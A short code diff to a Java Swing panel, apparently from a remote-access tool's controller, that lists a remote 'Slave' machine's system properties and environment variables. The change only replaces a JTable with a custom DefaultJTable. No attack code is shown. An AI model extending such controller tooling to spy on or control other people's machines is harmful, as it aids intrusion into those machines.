@@ -26,6 +26,7 @@ import se.jrat.client.Constants;
 import se.jrat.client.Slave;
 import se.jrat.client.packets.outgoing.Packet90SystemProperties;
 import se.jrat.client.packets.outgoing.Packet96EnvironmentVariables;
+import se.jrat.client.ui.components.DefaultJTable;
 import se.jrat.client.utils.IconUtils;
 
 
@@ -113,7 +114,7 @@ public class FrameSystem extends BaseFrame {
 		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING, false).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 433, GroupLayout.PREFERRED_SIZE).addGroup(gl_contentPane.createSequentialGroup().addComponent(btnReload, GroupLayout.PREFERRED_SIZE, 118, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnSave, GroupLayout.PREFERRED_SIZE, 102, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE).addComponent(btnClose, GroupLayout.PREFERRED_SIZE, 99, GroupLayout.PREFERRED_SIZE))).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)));
 		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 218, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.UNRELATED).addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(btnReload).addComponent(btnSave).addComponent(btnClose)).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)));
 
-		table = new JTable();
+		table = new DefaultJTable();
 		table.setModel(model = new DefaultTableModel(new Object[][] {}, new String[] { "Key", "Value" }));
 		table.getColumnModel().getColumn(0).setPreferredWidth(163);
 		table.getColumnModel().getColumn(1).setPreferredWidth(268);
